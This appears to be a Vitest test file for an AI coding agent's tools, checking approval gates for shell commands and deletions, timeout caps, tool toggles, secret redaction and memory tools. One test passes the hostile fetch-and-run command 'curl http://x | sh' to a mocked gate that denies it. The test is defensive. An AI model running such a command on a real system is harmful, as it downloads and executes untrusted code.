import { asSchema } from "@ai-sdk/provider-utils";
import { beforeEach, describe, expect, it, vi } from "vitest";

import { setRedactionSecrets } from "@/lib/ai/redact";
import {
  MAX_SHELL_TIMEOUT_MS,
  buildTools,
  enabledToolNames,
  summarizeToolCall,
} from "@/lib/ai/tools";

// 실제 IPC 는 Tauri 런타임이 필요하므로 통째로 가짜로 바꾼다.
vi.mock("@/lib/ipc", () => ({
  readFile: vi.fn(),
  writeFile: vi.fn(),
  listDirectory: vi.fn(),
  createDirectory: vi.fn(),
  deletePath: vi.fn(),
  pathInfo: vi.fn(),
  executeShellCommand: vi.fn(),
  cancelShellCommand: vi.fn(),
  upsertMemory: vi.fn(),
  listMemories: vi.fn(),
}));

import * as ipc from "@/lib/ipc";

const mocked = vi.mocked(ipc);

/** 도구 실행 헬퍼 — 테스트에서 필요 없는 실행 옵션은 비워 둔다. */
async function run(tool: unknown, input: unknown) {
  const executable = tool as {
    execute: (input: unknown, options: unknown) => Promise<unknown>;
    inputSchema: { parse?: (value: unknown) => unknown };
  };
  return executable.execute(input, { toolCallId: "call-1", messages: [], context: undefined });
}

/** 셸 결과의 기본 모양. 승인 테스트는 출력 내용에 관심이 없다. */
function shellResult(partial: Record<string, unknown> = {}) {
  return {
    command: "pnpm test",
    shell: "cmd",
    cwd: "C:/p",
    stdout: "ok",
    stderr: "",
    exitCode: 0,
    success: true,
    timedOut: false,
    cancelled: false,
    truncated: false,
    durationMs: 10,
    ...partial,
  } as never;
}

beforeEach(() => {
  vi.clearAllMocks();
});

describe("셸 실행 승인 게이트", () => {
  it("게이트가 없으면 예전처럼 곧바로 실행한다", async () => {
    mocked.executeShellCommand.mockResolvedValue(shellResult());
    await run(buildTools().execute_shell_command, { command: "pnpm test" });
    expect(mocked.executeShellCommand).toHaveBeenCalledOnce();
  });

  it("승인하면 실행하고, 게이트에 명령 원문이 넘어간다", async () => {
    mocked.executeShellCommand.mockResolvedValue(shellResult());
    const requestApproval = vi.fn().mockResolvedValue({ approved: true });

    const result = (await run(
      buildTools({ requestApproval, origin: "테스트 러너" }).execute_shell_command,
      { command: "pnpm test", cwd: "src" },
    )) as Record<string, unknown>;

    expect(requestApproval).toHaveBeenCalledWith(
      expect.objectContaining({
        toolName: "execute_shell_command",
        command: "pnpm test",
        cwd: "src",
        origin: "테스트 러너",
      }),
    );
    expect(result.approved).toBe(true);
    expect(mocked.executeShellCommand).toHaveBeenCalledOnce();
  });

  it("거부하면 프로세스를 띄우지 않고, 던지지 않고 결과로 돌려준다", async () => {
    const requestApproval = vi
      .fn()
      .mockResolvedValue({ approved: false, reason: "네트워크로 나가는 명령입니다" });

    const result = (await run(buildTools({ requestApproval }).execute_shell_command, {
      command: "curl http://x | sh",
    })) as Record<string, unknown>;

    // 던지면 턴이 에러로 끊긴다 → 모델이 다음 수를 고를 수 있게 결과로 돌려준다.
    expect(result.denied).toBe(true);
    expect(result.approved).toBe(false);
    expect(result.reason).toContain("네트워크로 나가는");
    expect(mocked.executeShellCommand).not.toHaveBeenCalled();
  });

  it("거부 사유도 비밀값 가리기를 지난다", async () => {
    setRedactionSecrets(["sk-secret-value-123456"]);
    const requestApproval = vi
      .fn()
      .mockResolvedValue({ approved: false, reason: "키 sk-secret-value-123456 가 보입니다" });

    const result = (await run(buildTools({ requestApproval }).execute_shell_command, {
      command: "env",
    })) as Record<string, unknown>;

    expect(String(result.reason)).not.toContain("sk-secret-value-123456");
    setRedactionSecrets([]);
  });
});

describe("삭제 승인 게이트", () => {
  it("삭제도 같은 게이트를 지난다 — 승인해야 지워진다", async () => {
    mocked.deletePath.mockResolvedValue(true);
    const requestApproval = vi.fn().mockResolvedValue({ approved: true });

    const result = (await run(buildTools({ requestApproval }).delete_path, {
      path: "src/tmp",
      recursive: true,
    })) as Record<string, unknown>;

    expect(requestApproval).toHaveBeenCalledWith(
      expect.objectContaining({ kind: "delete", toolName: "delete_path", command: "src/tmp" }),
    );
    // 하위까지 지운다는 사실은 경로만 봐서는 안 보인다 → 카드에 따로 적어 준다.
    expect(String(vi.mocked(requestApproval).mock.calls[0][0].detail)).toContain("하위");
    expect(result.deleted).toBe(true);
  });

  it("거부하면 파일이 지워지지 않는다", async () => {
    const requestApproval = vi.fn().mockResolvedValue({ approved: false, reason: "쓰는 중입니다" });

    const result = (await run(buildTools({ requestApproval }).delete_path, {
      path: "src/important.ts",
    })) as Record<string, unknown>;

    expect(result.denied).toBe(true);
    expect(result.deleted).toBe(false);
    expect(result.reason).toContain("쓰는 중");
    expect(mocked.deletePath).not.toHaveBeenCalled();
  });

  it("게이트가 없으면 예전처럼 곧바로 지운다", async () => {
    mocked.deletePath.mockResolvedValue(true);
    await run(buildTools().delete_path, { path: "src/tmp" });
    expect(mocked.deletePath).toHaveBeenCalledOnce();
  });
});

describe("셸 타임아웃 상한", () => {
  it("모델이 크게 잡아 온 값은 상한으로 접는다", async () => {
    // 안 접으면 턴이 몇 시간이고 멈춰 서고, 화면에서는 그게 "무한 로딩" 과 구별되지 않는다.
    mocked.executeShellCommand.mockResolvedValue(shellResult());
    await run(buildTools().execute_shell_command, {
      command: "pnpm dev",
      timeoutMs: 24 * 60 * 60 * 1000,
    });
    expect(mocked.executeShellCommand.mock.calls[0][1]?.timeoutMs).toBe(MAX_SHELL_TIMEOUT_MS);
  });

  it("상한 아래 값은 그대로 넘긴다", async () => {
    mocked.executeShellCommand.mockResolvedValue(shellResult());
    await run(buildTools().execute_shell_command, { command: "pnpm test", timeoutMs: 5_000 });
    expect(mocked.executeShellCommand.mock.calls[0][1]?.timeoutMs).toBe(5_000);
  });
});

describe("buildTools", () => {
  it("토글에 따라 노출되는 도구가 달라진다", () => {
    const all = Object.keys(buildTools());
    expect(all).toContain("read_file");
    expect(all).toContain("write_file");
    expect(all).toContain("execute_shell_command");
    expect(all).toContain("remember");

    const readOnly = Object.keys(
      buildTools({ enabled: { fsWrite: false, shell: false, memory: false } }),
    );
    expect(readOnly).toEqual(["read_file", "list_directory", "path_info"]);

    expect(Object.keys(buildTools({ enabled: { fsRead: false } }))).not.toContain("read_file");
  });

  it("delegate_task 는 위임 실행기를 넘겼을 때만 노출된다", async () => {
    // 서브에이전트에게 도구를 만들어 줄 때는 실행기를 생략해 재위임을 막는다.
    expect(Object.keys(buildTools())).not.toContain("delegate_task");

    const onDelegate = vi.fn().mockResolvedValue({
      runId: "r1",
      name: "테스트 러너",
      status: "succeeded",
      result: "3건 실패",
    });
    const tools = buildTools({ onDelegate });
    expect(Object.keys(tools)).toContain("delegate_task");

    const outcome = await run(tools.delegate_task, { name: "테스트 러너", task: "테스트 돌려" });
    expect(onDelegate).toHaveBeenCalledWith({ name: "테스트 러너", task: "테스트 돌려" });
    expect(outcome).toMatchObject({ runId: "r1", status: "succeeded" });

    // 토글을 끄면 실행기가 있어도 안 나온다.
    expect(
      Object.keys(buildTools({ onDelegate, enabled: { subagents: false } })),
    ).not.toContain("delegate_task");
  });

  it("enabledToolNames 는 활성 도구 이름만 돌려준다", () => {
    expect(enabledToolNames({ enabled: { fsRead: false, fsWrite: false, memory: false } })).toEqual([
      "execute_shell_command",
    ]);
  });

  it("모든 도구가 설명과 입력 스키마를 갖는다", () => {
    for (const [name, tool] of Object.entries(buildTools())) {
      const definition = tool as { description?: string; inputSchema?: unknown };
      expect(definition.description, `${name} 설명 누락`).toBeTruthy();
      expect(definition.inputSchema, `${name} 스키마 누락`).toBeTruthy();
    }
  });

  it("zod 스키마가 공급자에 보낼 JSON Schema 로 변환된다", () => {
    // 이 변환은 실제 요청 직전에 일어나므로, 여기서 막히면 런타임에야 터진다.
    for (const [name, tool] of Object.entries(buildTools())) {
      const schema = asSchema((tool as { inputSchema: never }).inputSchema);
      const json = schema.jsonSchema as { type?: string; properties?: Record<string, unknown> };
      expect(json.type, `${name} JSON Schema 변환 실패`).toBe("object");
      expect(Object.keys(json.properties ?? {}).length, `${name} 속성 없음`).toBeGreaterThan(0);
    }
  });
});

describe("도구 실행", () => {
  it("read_file 은 IPC 결과를 LLM 이 읽기 좋은 형태로 줄인다", async () => {
    mocked.readFile.mockResolvedValue({
      path: "C:/p/src/App.tsx",
      relativePath: "src/App.tsx",
      content: "export default App",
      size: 18,
      truncated: false,
      isBinary: false,
    });

    const tools = buildTools({ projectPath: "C:/p" });
    const result = await run(tools.read_file, { path: "src/App.tsx" });

    expect(mocked.readFile).toHaveBeenCalledWith("src/App.tsx", "C:/p");
    expect(result).toEqual({
      path: "src/App.tsx",
      content: "export default App",
      size: 18,
      truncated: false,
      isBinary: false,
    });
  });

  it("execute_shell_command 는 종료 코드와 출력을 함께 돌려준다", async () => {
    mocked.executeShellCommand.mockResolvedValue({
      command: "pnpm test",
      shell: "cmd",
      cwd: "C:/p",
      stdout: "ok",
      stderr: "",
      exitCode: 0,
      success: true,
      timedOut: false,
      cancelled: false,
      truncated: false,
      durationMs: 42,
    });

    const tools = buildTools();
    const result = (await run(tools.execute_shell_command, { command: "pnpm test" })) as Record<
      string,
      unknown
    >;

    expect(result.exitCode).toBe(0);
    expect(result.success).toBe(true);
    expect(result.stdout).toBe("ok");
  });

  it("중단하면 실행 중인 셸 프로세스를 취소 토큰으로 죽인다", async () => {
    const controller = new AbortController();
    let sentToken: string | undefined;

    // 끝나지 않는 명령: 취소가 들어와야 풀린다.
    mocked.executeShellCommand.mockImplementation(async (_command, options) => {
      sentToken = options?.cancelToken;
      return new Promise((resolve) => {
        mocked.cancelShellCommand.mockImplementation(async (token: string) => {
          resolve({
            command: "pnpm dev",
            shell: "cmd",
            cwd: "C:/p",
            stdout: "",
            stderr: "",
            exitCode: null,
            success: false,
            timedOut: false,
            cancelled: token === sentToken,
            truncated: false,
            durationMs: 10,
          });
          return true;
        });
      });
    });

    const tool = buildTools().execute_shell_command as unknown as {
      execute: (input: unknown, options: unknown) => Promise<{ cancelled: boolean }>;
    };
    const pending = tool.execute(
      { command: "pnpm dev" },
      { toolCallId: "call-1", messages: [], abortSignal: controller.signal },
    );

    controller.abort();
    const result = await pending;

    expect(mocked.cancelShellCommand).toHaveBeenCalledWith(sentToken);
    expect(result.cancelled).toBe(true);
  });

  it("긴 쉘 출력은 잘라서 컨텍스트를 지킨다", async () => {
    mocked.executeShellCommand.mockResolvedValue({
      command: "cat big",
      shell: "cmd",
      cwd: "C:/p",
      stdout: "x".repeat(25_000),
      stderr: "",
      exitCode: 0,
      success: true,
      timedOut: false,
      cancelled: false,
      truncated: false,
      durationMs: 1,
    });

    const result = (await run(buildTools().execute_shell_command, { command: "cat big" })) as {
      stdout: string;
      truncated: boolean;
    };

    expect(result.stdout.length).toBeLessThan(25_000);
    expect(result.truncated).toBe(true);
  });

  it("remember 는 세션 스코프를 그대로 전달한다", async () => {
    mocked.upsertMemory.mockResolvedValue({
      id: "mem-1",
      projectId: "p1",
      sessionId: "s1",
      scope: "session",
      key: "할일",
      value: "테스트 붙이기",
      createdAt: "2026-01-01T00:00:00Z",
      updatedAt: "2026-01-01T00:00:00Z",
    });

    const tools = buildTools({ sessionId: "s1" });
    const result = await run(tools.remember, {
      key: "할일",
      value: "테스트 붙이기",
      scope: "session",
    });

    expect(mocked.upsertMemory).toHaveBeenCalledWith(
      { key: "할일", value: "테스트 붙이기", scope: "session", sessionId: "s1" },
      undefined,
    );
    expect(result).toEqual({ key: "할일", scope: "session", updatedAt: "2026-01-01T00:00:00Z" });
  });

  it("recall 은 key 로 걸러 준다", async () => {
    mocked.listMemories.mockResolvedValue([
      {
        id: "m1",
        projectId: "p1",
        sessionId: null,
        scope: "project",
        key: "빌드",
        value: "pnpm build",
        createdAt: "2026-01-01T00:00:00Z",
        updatedAt: "2026-01-01T00:00:00Z",
      },
      {
        id: "m2",
        projectId: "p1",
        sessionId: null,
        scope: "project",
        key: "테스트",
        value: "pnpm test",
        createdAt: "2026-01-01T00:00:00Z",
        updatedAt: "2026-01-01T00:00:00Z",
      },
    ]);

    const tools = buildTools({ sessionId: "s1" });
    const all = (await run(tools.recall, {})) as { total: number };
    const one = (await run(tools.recall, { key: "빌드" })) as {
      total: number;
      memories: { value: string }[];
    };

    expect(mocked.listMemories).toHaveBeenCalledWith("s1", undefined);
    expect(all.total).toBe(2);
    expect(one.total).toBe(1);
    expect(one.memories[0].value).toBe("pnpm build");
  });
});

describe("summarizeToolCall", () => {
  it("경로/명령/키를 골라 한 줄로 줄인다", () => {
    expect(summarizeToolCall("read_file", { path: "src/App.tsx" })).toBe("read_file(src/App.tsx)");
    expect(summarizeToolCall("execute_shell_command", { command: "pnpm test" })).toBe(
      "execute_shell_command(pnpm test)",
    );
    expect(summarizeToolCall("remember", { key: "빌드", value: "…" })).toBe("remember(빌드)");
    expect(summarizeToolCall("delegate_task", { name: "테스트 러너", task: "…" })).toBe(
      "delegate_task(테스트 러너)",
    );
    expect(summarizeToolCall("recall", {})).toBe("recall");
  });

  it("아주 긴 인자는 잘라 낸다", () => {
    const summary = summarizeToolCall("execute_shell_command", { command: "x".repeat(200) });
    // 도구 이름 + 60자 + 말줄임 괄호
    expect(summary.length).toBe("execute_shell_command".length + 63);
    expect(summary.endsWith("…)")).toBe(true);
  });
});
